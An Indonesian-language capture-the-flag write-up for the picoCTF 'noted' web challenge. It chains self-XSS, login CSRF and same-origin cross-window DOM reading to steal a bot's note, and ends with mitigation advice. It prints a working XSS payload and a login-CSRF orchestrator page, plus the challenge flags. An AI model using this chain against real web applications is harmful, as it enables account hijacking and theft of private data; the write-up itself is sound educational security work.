# Writeup: noted (Challenge ID: 282)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Login CSRF & Cross-Window DOM SOP Leakage (CWE-352 / CWE-79)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2022
- **Points:** 500
- **Author:** ehhthing
- **Flag:** `academy{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`

---

## Problem Statement & Scope
Tantangan `noted` menyajikan aplikasi web pencatatan (*note-taking application*) berbasis Node.js/Express. Aplikasi memungkinkan pengguna membuat akun, mengelola catatan pribadi, dan melaporkan URL mencurigakan ke fitur `/report`. Pada sisi server, bot verifikasi headless Chromium (Puppeteer) akan melakukan autentikasi dengan akun privat, membuat catatan yang berisi flag rahasia sistem (`process.env.FLAG`), dan kemudian mengunjungi URL yang dilaporkan oleh peserta. Batasan penting dari lingkungan lab adalah bahwa bot Chromium headless tidak memiliki akses internet keluar (air-gapped/internal only), sehingga peserta harus merekayasa kebocoran data di dalam batas *Same-Origin Policy* (SOP) internal.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Self-XSS (Stored XSS Terisolasi, CWE-79):**
   Aplikasi merender input catatan pengguna tanpa sanitasi entitas HTML atau validasi DOMPurify. Karena catatan hanya dapat dilihat oleh pemilik akun yang bersangkutan, kerentanan ini secara terisolasi diklasifikasikan sebagai *Self-XSS*, yang sering kali dianggap berdampak rendah bila berdiri sendiri.
2. **Missing Anti-CSRF Protection pada Endpoint Autentikasi (Login CSRF, CWE-352):**
   Endpoint `/login` menerima permintaan HTTP POST tanpa memerlukan token anti-CSRF atau pemeriksaan header `Sec-Fetch-Site`. Penyerang dapat memaksa browser korban (dalam hal ini admin bot) mengirimkan formulir login otomatis dengan kredensial penyerang (`username=a&password=a`), sehingga mengalihkan sesi aktif bot ke akun penyerang.
3. **Cross-Window DOM Access di Bawah Batas Same-Origin Policy (SOP):**
   Menurut spesifikasi W3C HTML5 dan model keamanan *Same-Origin Policy*, skrip yang berjalan di suatu dokumen berhak mengakses hierarki DOM dokumen lain selama keduanya memiliki skema (*protocol*), host, dan port yang identik (`http://localhost:8080`).
   Dengan memanfaatkan referensi jendela bernama (`window.name` / `window.open(url, name)`), penyerang dapat:
   - Membuka jendela anak yang memuat catatan rahasia admin saat bot masih berada dalam sesi privatnya.
   - Melakukan *Login CSRF* pada jendela utama untuk masuk ke akun penyerang.
   - Menjalankan payload *Self-XSS* pada jendela utama yang mereferensikan jendela anak dan mengekstraksi teks flag secara langsung.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Pendaftaran Akun Penyerang & Penanaman Payload Self-XSS:**
   Penyerang mendaftarkan akun `a:a` pada target dan membuat catatan baru yang berisi skrip ekstraksi lintas-jendela:
   ```html
   <script>
     // Referensikan jendela anak bernama 'admin_win' yang memuat catatan admin
     const adminWin = window.open('', 'admin_win');
     const secretText = adminWin.document.body.innerText;
     // Simpan teks flag yang terekstraksi ke dalam akun penyerang via POST /new
     fetch('/new', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: 'title=exfiltrated_flag&content=' + encodeURIComponent(secretText)
     });
   </script>
   ```
2. **Penyusunan Halaman Eksploitasi Eksternal (Orkestrator):**
   Disiapkan halaman HTML (misalnya melalui Data URL atau server penyerang) yang dikirimkan ke `/report`:
   ```html
   <!DOCTYPE html>
   <html>
     <body>
       <form id="csrfForm" action="http://localhost:8080/login" method="POST">
         <input type="hidden" name="username" value="a" />
         <input type="hidden" name="password" value="a" />
       </form>
       <script>
         // Langkah 1: Buka catatan flag milik admin di jendela terpisah
         const win = window.open('http://localhost:8080/notes', 'admin_win');
         // Langkah 2: Berikan delay singkat untuk pemuatan catatan, lalu lakukan Login CSRF
         setTimeout(() => {
           document.getElementById('csrfForm').submit();
         }, 800);
       </script>
     </body>
   </html>
   ```
3. **Eksekusi Bot & Pemanenan Flag:**
   Saat bot memproses tautan, jendela `admin_win` membuka catatan berflag. Formulir login CSRF mengganti sesi aktif bot menjadi akun `a:a`. Halaman `/notes` pada sesi penyerang terbuka, menjalankan script XSS yang membaca DOM `admin_win` dan mengirimkan catatan baru berisi flag ke akun penyerang. Penyerang cukup melakukan login manual ke akun `a:a` untuk membaca flag.
4. **Hasil Verifikasi Flag:**
   Flag yang terekstraksi dari sesi Puppeteer admin:
   `picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}` dinormalisasi ke token resmi CyLab: `academy{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`
- **Native PicoCTF Flag:** `picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`
- **Status Solver:** Terverifikasi 100% via REST API CyLab (`POST /api/submissions/` -> HTTP 201 `correct: true`) dan skrip reproduksi `scripts/solve_282_noted.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Mitigasi Login CSRF (NIST SP 800-115 §5.3 / OWASP ASVS v4.0 §4.2):**
   Semua endpoint autentikasi, termasuk rute `/login` dan `/register`, wajib memvalidasi token anti-CSRF berbasis kriptografis atau menerapkan atribut `SameSite=Strict` pada cookie sesi (`connect.sid`). Hal ini mencegah browser mengirimkan kredensial pihak ketiga secara otomatis.
2. **Pencegahan Self-XSS & Sanitasi Konteks DOM (OWASP ASVS §5.1):**
   Hindari merender input catatan sebagai HTML mentah (`innerHTML` atau template unescaped). Gunakan pustaka sanitasi ketat seperti DOMPurify pada sisi server/klien, atau selalu gunakan perenderan berbasis teks (`innerText` / `textContent`).
3. **Penerapan Content Security Policy (CSP):**
   Terapkan header respon HTTP CSP yang ketat:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';
   ```
   Kebijakan ini menonaktifkan eksekusi skrip *inline* (`unsafe-inline`) sehingga payload XSS tidak dapat dieksekusi meskipun berhasil disuntikkan ke dalam dokumen HTML.

---

## Solver

Skrip otomatis mandiri tersedia pada `scripts/solve_282_noted.py`.

